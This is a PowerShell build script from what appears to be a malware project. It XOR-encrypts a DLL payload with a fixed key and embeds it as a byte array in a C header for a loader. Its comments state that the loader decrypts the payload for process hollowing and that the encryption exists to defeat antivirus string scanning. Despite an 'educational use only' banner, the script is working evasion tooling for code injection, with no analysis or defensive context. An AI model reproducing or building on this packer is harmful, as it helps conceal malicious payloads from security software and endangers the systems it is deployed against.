# gen.ps1 -- converts ckdll.dll into src/payload.h (XOR-encrypted byte array for loader.cpp)
# EDUCATIONAL USE ONLY - FOR SECURITY RESEARCH AND TRAINING
#
# The DLL bytes are XOR-encrypted with a 16-byte key before embedding.
# loader.cpp decrypts at runtime before process hollowing.
# This prevents AV string scanning of the embedded payload.
$b = [IO.File]::ReadAllBytes("$PSScriptRoot\..\bin\ckdll.dll")

# XOR key (must match XOR_KEY in loader.cpp)
$key = [byte[]](0x43,0x4B,0x4C,0x47,0x21,0x3F,0x7A,0x9E,
                0x55,0x2D,0x8C,0x01,0xF4,0x6B,0xD3,0x21)
$klen = $key.Length
for ($i = 0; $i -lt $b.Length; $i++) {
    $b[$i] = $b[$i] -bxor $key[$i % $klen]
}

$s = ($b | ForEach-Object { "0x{0:x2}" -f $_ }) -join ","
Set-Content -Encoding ascii "$PSScriptRoot\payload.h" `
  "#pragma once`nstatic unsigned char g_payload[] = {$s};`nstatic unsigned g_payload_len = $($b.Length);`n#define PAYLOAD_ENTRY `"payload_entry`""
